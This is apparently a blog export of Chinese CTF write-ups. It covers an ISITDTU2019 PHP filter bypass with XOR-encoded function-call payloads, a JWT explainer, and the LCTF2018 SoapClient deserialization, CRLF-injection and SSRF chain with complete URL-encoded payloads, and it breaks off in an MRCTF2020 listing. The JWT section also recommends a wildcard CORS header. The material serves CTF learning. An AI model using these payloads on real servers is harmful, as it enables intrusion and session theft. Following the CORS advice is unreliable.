<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">'internal'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9\'"\`$&amp;.,|[{_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">.</span><span class="token string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">//运行结果</span>
bcmul
rtrim
trim
ltrim
chr
link
unlink
tan
atan
atanh
tanh
intval
mail
min
max
virtual
</code></pre>
<pre><code>urlencode(~'phpinfo');</code></pre>
<p><img src="/2021/10/07/isitdtu2019-easyphp/image-20211007212315111.png" alt="image-20211007212315111"></p>
<p>disable_functions:</p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,</code></pre>
<pre><code>print_r(scandir('.'));=((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre>
<pre><code>print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre>
<pre><code>show_source(end(scandir(.)));=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></pre>
]]></content>
  </entry>
  <entry>
    <title>JSON Web Token</title>
    <url>/2021/07/24/json-web-token/</url>
    <content><![CDATA[<h2 id="JSON-Web-Token的定义"><a href="#JSON-Web-Token的定义" class="headerlink" title="JSON Web Token的定义"></a>JSON Web Token的定义</h2><ul>
<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)</li>
<li>定义了一种紧凑的、自包含的方式</li>
<li>作为JSON对象在各方之间安全地传输信息</li>
<li>是数字签名 -&gt; 可以被验证和信任</li>
</ul>
<h2 id="JSON-Web-Token的使用场景"><a href="#JSON-Web-Token的使用场景" class="headerlink" title="JSON Web Token的使用场景"></a>JSON Web Token的使用场景</h2><ul>
<li><strong>Authorization</strong> (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
<li><strong>Information Exchange</strong> (信息交换) :JWTs可以被签名，例如，用公钥/私钥对，可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。</li>
</ul>
<h2 id="JSON-Web-Token的结构"><a href="#JSON-Web-Token的结构" class="headerlink" title="JSON Web Token的结构"></a>JSON Web Token的结构</h2><p><img src="/2021/07/24/json-web-token/image-20210726041459952.png" alt="image-20210726041459952"></p>
<p>三部分 圆点连接</p>
<ol>
<li><strong>Header</strong></li>
<li><strong>Payload</strong></li>
<li><strong>Signature</strong></li>
</ol>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
<p>例如：</p>
<pre><code>{
    "alg":"HS256",
    "typ":"JWT"
}</code></pre>
<p>对其进行base64编码后得到JWT第一部分</p>
<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
<ul>
<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li>
<li>Public claims : 可以随意定义。</li>
<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li>
</ul>
<p>例如：</p>
<pre><code>{
    "sub":"123456",
    "name":"CTF",
    "admin":ture
}</code></pre>
<p>对其进行base64得到JWT第二部分</p>
<p>注意：JWT的header或payload勿放置未加密的敏感信息。</p>
<h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>signature由base64(header)，base64(payload)和秘钥组成，签名算法是header中指定的那个，然对它们签名即可。</p>
<p>例如：</p>
<pre><code>HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)</code></pre>
<p><img src="/2021/07/24/json-web-token/image-20210726042519069.png" alt="image-20210726042519069"></p>
<p><img src="/2021/07/24/json-web-token/image-20210726043023893.png" alt="image-20210726043023893"></p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiemhhbmdzYW4iLCJjb2RlIjoiMjEyMzQxMCJ9.aaa</code></pre>
<h2 id="JSON-Web-Token的工作"><a href="#JSON-Web-Token的工作" class="headerlink" title="JSON Web Token的工作"></a>JSON Web Token的工作</h2><ol>
<li><p>用户登录</p>
</li>
<li><p>返回JWT</p>
</li>
<li><p>token成为用户凭证（保存令牌不应超过需要时间）</p>
</li>
<li><p>访问受保护的路由或者资源，JWT放在Authorization header中，用Bearer schema。</p>
<img src="/2021/07/24/json-web-token/image-20210726043710776.png" alt="image-20210726043710776" style="zoom: 67%;">
</li>
<li><p>服务器检查JWT是否有效</p>
<p>如果token是在授权头（Authorization header）中发送的，那么跨源资源共享(CORS)将不会成为问题，因为它不使用cookie</p>
<img src="/2021/07/24/json-web-token/image-20210726043830317.png" alt="image-20210726043830317" style="zoom:67%;">

<ul>
<li>应用（或者客户端）想授权服务器请求授权。例如，如果用授权码流程的话，就是/oauth/authorize</li>
<li>当授权被许可以后，授权服务器返回一个access token给应用</li>
<li>应用使用access token访问受保护的资源（比如：API）</li>
</ul>
</li>
</ol>
<h2 id="基于Token的身份认证-与-基于服务器的身份认证"><a href="#基于Token的身份认证-与-基于服务器的身份认证" class="headerlink" title="基于Token的身份认证 与 基于服务器的身份认证"></a>基于Token的身份认证 与 基于服务器的身份认证</h2><h3 id="基于服务器的身份认证"><a href="#基于服务器的身份认证" class="headerlink" title="基于服务器的身份认证"></a>基于服务器的身份认证</h3><p>传统的做法是将已经认证过的用户信息存储在服务器上，比如Session。用户下次请求的时候带着Session ID，然后服务器以此检查用户是否认证过。</p>
<p>这种基于服务器的身份认证方式存在一些问题：</p>
<ul>
<li>Sessions : 每次用户认证通过以后，服务器需要创建一条记录保存用户信息，通常是在内存中，随着认证通过的用户越来越多，服务器的在这里的开销就会越来越大。</li>
<li>Scalability : 由于Session是在内存中的，这就带来一些扩展性的问题。</li>
<li>CORS : 当我们想要扩展我们的应用，让我们的数据被多个移动设备使用时，我们必须考虑跨资源共享问题。当使用AJAX调用从另一个域名下获取资源时，我们可能会遇到禁止请求的问题。</li>
<li>CSRF : 用户很容易受到CSRF攻击。</li>
</ul>
<h3 id="JWT与Session的差异"><a href="#JWT与Session的差异" class="headerlink" title="JWT与Session的差异"></a>JWT与Session的差异</h3><p>相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。</p>
<p>Session方式存储用户信息的最大问题在于要占用大量服务器内存，增加服务器的开销。</p>
<p>而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p>
<p>Session的状态是存储在服务器端，客户端只有session id；而Token的状态是存储在客户端。</p>
<p><img src="/2021/07/24/json-web-token/image-20210726044027547.png" alt="image-20210726044027547"></p>
<h3 id="基于Token的身份认证是如何工作的"><a href="#基于Token的身份认证是如何工作的" class="headerlink" title="基于Token的身份认证是如何工作的"></a>基于Token的身份认证是如何工作的</h3><p>基于Token的身份认证是无状态的，服务器或者Session中不会存储任何用户信息。</p>
<blockquote>
<p>没有会话信息意味着应用程序可以根据需要扩展和添加更多的机器，而不必担心用户登录的位置。</p>
</blockquote>
<p>虽然这一实现可能会有所不同，但其主要流程如下：</p>
<ol>
<li>用户携带用户名和密码请求访问</li>
<li>服务器校验用户凭据</li>
<li>应用提供一个token给客户端</li>
<li>客户端存储token，并且在随后的每一次请求中都带着它</li>
<li>服务器校验token并返回数据</li>
</ol>
<p>注意：</p>
<ol>
<li>每一次请求都需要token</li>
<li>Token应该放在请求header中</li>
<li>我们还需要将服务器设置为接受来自所有域的请求，用Access-Control-Allow-Origin: *</li>
</ol>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>原文：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p>
<p><a href="https://jwt.io/">https://jwt.io/</a></p>
<p><a href="https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around">https://scotch.io/tutorials/the-ins-and-outs-of-token-based-authentication#toc-why-tokens-came-around</a></p>
<p><a href="https://tools.ietf.org/html/rfc7519#section-3">https://tools.ietf.org/html/rfc7519#section-3</a></p>
<p><a href="http://blog.leapoahead.com/2015/09/06/understanding-jwt/">http://blog.leapoahead.com/2015/09/06/understanding-jwt/</a></p>
<p><a href="https://cnodejs.org/topic/557844a8e3cc2f192486a8ff">https://cnodejs.org/topic/557844a8e3cc2f192486a8ff</a></p>
<p><a href="http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/">http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/</a></p>
]]></content>
  </entry>
  <entry>
    <title>LCTF：2018-Bestphp&#39;sRevenge</title>
    <url>/2021/09/15/lctf-2018-bestphp-srevenge/</url>
    <content><![CDATA[<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><h5 id="1-1-call-user-func"><a href="#1-1-call-user-func" class="headerlink" title="1.1 call_user_func"></a>1.1 call_user_func</h5><p>用来执行函数，但我测试的，只能执行一部分函数，像eval函数，就执行不了。</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span>fun<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span>      \<span class="token package"><span class="token punctuation">\</span>outcome</span>：<span class="token number">12</span></code></pre>
<p>但如果传入的参数，是一个数组，且数组的第一个值是一个类的名字，或一个对象，那么，就会把数组的第二个值，当做方法，然后执行。</p>
<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">fun</span><span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  \<span class="token package"><span class="token punctuation">\</span></span>当调用的方法不存在时，执行
        <span class="token keyword">echo</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"aaaas"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter">?></span>   \<span class="token package"><span class="token punctuation">\</span>outcome</span>：<span class="token number">11</span></code></pre>
<h5 id="1-2-php序列化引擎"><a href="#1-2-php序列化引擎" class="headerlink" title="1.2 php序列化引擎"></a>1.2 php序列化引擎</h5><p>假如我们使用php_serialize引擎时进行数据存储时的序列化，可以得到内容</p>
<pre><code>$_SESSION[‘name’] = ‘sky’;
a:1:{s:4:”name”;s:3:”sky”;}</code></pre>
<p>而在php引擎时进行数据存储时的序列化，可以得到另一个内容</p>
<pre><code>$_SESSION[‘name’] = ‘sky’;
name|s:3:”sky”</code></pre>
<p>php以“|”符号分隔键与值，那么如果我们用php_serialize做序列化引擎，且数组的值里，就包含“|”符号，</p>
<pre><code>$_SESSION[‘name’] = ‘|sky’;
a:1:{s:4:”name”;s:4:”|sky”;}</code></pre>
<p>然后用php引擎去反序列化，因为php以“|”符号分隔键与值，所以就会形成a:1:{s:4:”name”;s:3:”为键，sky为值得情况，这样一来，sky就会被单独得拿出来，进行反序列化，而不是直接被当做一个字符串，直接打印出来。</p>
<h5 id="1-3-cookie-和-session"><a href="#1-3-cookie-和-session" class="headerlink" title="1.3 cookie 和 session"></a>1.3 cookie 和 session</h5><p>做了这道题，我才真实的感受到，cookie和session，是一 一对应的。不同的cookie，它对应的session的值是不同的。<br>1.我们传入name=123，就会在此cookie，对应得session中，添加a:1:{s:4:”name”;s:3:”123”;}(sesion都是序列化存储的)</p>
<h5 id="1-4-CRLF-Injection漏洞"><a href="#1-4-CRLF-Injection漏洞" class="headerlink" title="1.4 CRLF Injection漏洞"></a>1.4 CRLF Injection漏洞</h5><p>CRLF Injection漏洞<br>这个是和下一个知识点联系在一起的，我们要让服务器去访问flag.php，且把flag存放在session里，那么我们就一定需要携带一个cookie去访问它。但是SoapClient这个类，好像没有指定cookie的接口，所以，我们就可以在user_agent里面，加上一个\r\n，然后再加上一个cookie，就达到了我们的目的。</p>
<h5 id="1-5-SoapClient"><a href="#1-5-SoapClient" class="headerlink" title="1.5 SoapClient"></a>1.5 SoapClient</h5><p>这是一个php内置的类，当__call方法被触发后，它可以发送HTTP和HTTPS请求。该类的构造函数如下：</p>
<pre><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></pre>
<p>第一个参数是用来指明是否是wsdl模式。</p>
<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。<br>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url</p>
<h6 id="1-6-ini-set-和-session-start"><a href="#1-6-ini-set-和-session-start" class="headerlink" title="1.6 ini_set 和 session_start"></a>1.6 ini_set 和 session_start</h6><p>我们要更改“session.serialize_handler”的值，本来应该使用ini_set这个函数的，但是这个函数，不接受数组，所以就不行了。于是我们就用session_start来代替，session.serialize_handler=php_serialize也变成了，serialize_handler=php_serialize。</p>
<h5 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h5><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'implode'</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> </code></pre>
<h5 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h5><pre><code>only localhost can get flag!session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){       $_SESSION['flag'] = $flag;   } only localhost can get flag!</code></pre>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><h5 id="revenge-php"><a href="#revenge-php" class="headerlink" title="revenge.php"></a>revenge.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string">'user_agent'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"H3ng\r\nCookie:PHPSESSID=ossmoro02qim3fshgteh2jd8o2"</span><span class="token punctuation">,</span>
        <span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'H3ng'</span><span class="token punctuation">,</span>
        <span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php'</span>
    <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>出现报错如下：</p>
<pre><code> Class 'SoapClient' not found in</code></pre>
<p>打开php.ini删除<code>extension=php_soap.dll</code>前面的分号</p>
<p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915200243159.png" alt="image-20210915200243159"></p>
<p>运行结果</p>
<pre><code>O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22H3ng%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A49%3A%22H3ng%0D%0ACookie%3APHPSESSID%3Dossmoro02qim3fshgteh2jd8o2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre>
<h5 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload:"></a>Payload:</h5><h5 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h5><pre><code>/?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22H3ng%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A49%3A%22H3ng%0D%0ACookie%3APHPSESSID%3Dossmoro02qim3fshgteh2jd8o2%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre>
<p>post</p>
<pre><code>serialize_handler=php_serialize</code></pre>
<p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915211322184.png" alt="image-20210915211322184"></p>
<ul>
<li>利用<code>call_user_func($_GET[‘f’], $_POST);</code>函数，改变此页面的序列化引擎，为php_serialize，</li>
<li>session_start();现在没啥用</li>
<li><code>$_SESSION[‘name’] = $_GET[‘name’];</code>将我们的序列化对象，传入session中，并在前面，加一个“|”符号。此时session会以php_serialize的规则储存：<code>a:1:{s:4:“name”;s:199:"|xxx…"}</code></li>
<li>var_dump($_SESSION); 打印<code>session：[“name”]=&gt;"|xxx…"</code></li>
</ul>
<h5 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h5><pre><code>/?f=extract</code></pre>
<p>post</p>
<pre><code>b=call_user_func</code></pre>
<ul>
<li>call_user_func($_GET[‘f’], $_POST); 将b变量，用extract函数，进行覆盖。覆盖为call_user_func。</li>
<li>session_start(); 此时的序列化引擎为php，此函数会按照php的方法，把我们刚才传入的session，进行反序列化。并储存在session中</li>
<li>$a = array(reset($_SESSION), ‘welcome_to_the_lctf2018’); 把我们的session与“welcome_to_the_lctf2018”和并为一个数组</li>
<li>call_user_func($b, $a); 因为$b变量已经被我们覆盖成了call_user_func，那么此时的程序，就变成了call_user_func(call_user_func,array($_session,‘welcome_to_the_lctf2018’));</li>
<li>$_session这个对象，会去调用“welcome_to_the_lctf2018”这个不存在的方法，于是__call方法被触发，服务器携带我们设置的cookie，去访问flag.php，然后把flag，储存在此cookie对应的session中。</li>
</ul>
<p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915211336458.png" alt="image-20210915211336458"></p>
<h5 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h5><p>接着访问cookie：ossmoro02qim3fshgteh2jd8o2也就是在revenge.php中构造的那个</p>
<p><img src="/2021/09/15/lctf-2018-bestphp-srevenge/image-20210915211407080.png" alt="image-20210915211407080"></p>
]]></content>
  </entry>
  <entry>
    <title>L3HCTF2021</title>
    <url>/2021/11/14/l3hctf2021/</url>
    <content><![CDATA[<h1 id="Image-Service-1"><a href="#Image-Service-1" class="headerlink" title="Image Service 1"></a>Image Service 1</h1><p>注册登录</p>
<p>发现可以上传图片并share</p>
<p>且存在admin账号需要localhost才能登陆</p>
<p>尝试xff 127.0.0.1和localhost失败</p>
<p>发现sharelist可以采用%00截断</p>
<p>burp中URL解码</p>
<p><img src="/2021/11/14/l3hctf2021/image-20211114151427550.png" alt="image-20211114151427550"></p>
<h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><p><img src="/2021/11/14/l3hctf2021/image-20211114150641142.png" alt="image-20211114150641142"></p>
<p>在复制的时候发现框选l3hctf会一起框选ctf</p>
<p>复制源码到vscode中：</p>
<p><img src="/2021/11/14/l3hctf2021/image-20211114150814776.png" alt="image-20211114150814776"></p>
<p><strong>payload：</strong></p>
<p><img src="/2021/11/14/l3hctf2021/image-20211114150851368.png" alt="image-20211114150851368"></p>
<p><img src="/2021/11/14/l3hctf2021/image-20211114150924773.png" alt="image-20211114150924773"></p>
]]></content>
  </entry>
  <entry>
    <title>MRCTF2020：Ezpop_Revenge</title>
    <url>/2021/10/04/mrctf2020-ezpop-revenge/</url>
    <content><![CDATA[<p><strong>flag.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token string">"MRCTF{******}"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">"我扌your problem?\nonly localhost can get flag!"</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><strong>plugin.php</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">HelloWorld_DB</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">"MRCTF{this_is_a_fake_flag}"</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$coincidence</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span>  <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">coincidence</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">coincidence</span><span class="token punctuation">[</span><span class="token string">'world'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name">HelloWorld_Plugin</span> <span class="token keyword">implements</span> <span class="token class-name">Typecho_Plugin_Interface</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'C0incid3nc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
